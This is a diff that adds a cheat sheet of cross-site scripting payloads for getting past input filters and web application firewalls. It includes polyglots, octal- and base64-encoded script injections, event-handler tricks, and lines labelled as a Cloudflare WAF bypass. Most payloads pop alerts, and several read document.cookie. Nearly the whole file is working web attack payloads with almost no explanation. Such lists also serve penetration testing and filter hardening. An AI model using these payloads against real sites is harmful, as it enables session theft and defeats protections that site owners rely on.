@@ -1,0 +1,46 @@
+XSS Bypass filter using polyglot 
+--><h2></div></div><script>alert(1)</script>
+
+XSS Bypass filter using Character Encoding with octal escape sequence
+encode 
+<iframe on only=1 onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\144\157\143\165\155\145\156\164\56\144\157\155\141\151\156\51')()">
+
+decode:
+<iframe on only=1 onload="[][ 'filter' ][ 'constructor' ]( 'alert(document.domain)' )()">
+
+Bypass filter XSS with array 
+<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>">
+
+XSS Bypass filter script tag removal [removed]alert(1)[removed]
+" onfocus=alert(1) "><"
+
+XSS Bypass filter using Event Handler
+" autofocus onfocus='alert(1)'
+
+Another XSS Bypass filter
+">\x3csVg/<sVg/oNloAd=alert(1337)//>\x3e
+'-alert(document/*xss*/.cookie)-'
+<title><img title="</title><img src onerror=alert(1)>"></title>
+<svg><animate onbegin=alert(1)></svg> (working on blackbox.ai)
+<svg id="1"><script>alert(origin)</script></svg>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E
+<details custom-attr= x open ontoggle="prompt()";
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<object type="image/png" data="invalid.png" onload="alert(1)"></object>
+
+
+XSS Bypass 404 Not Found 
+<svg on onload=(alert)(document.domain)> 
+
+XSS Bypass Access Denied using meta tag with base64 encoding
+0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg=="HTTP-EQUIV="refresh"
+
+XSS Bypass filter using embed and svg with base64 encoding
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+XSS Bypass WAF Cloudflare 
+">"><Svg On Only=1 Onload=alert(1)>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><Body/oNpagEshoW=(prompt)(1)>
+
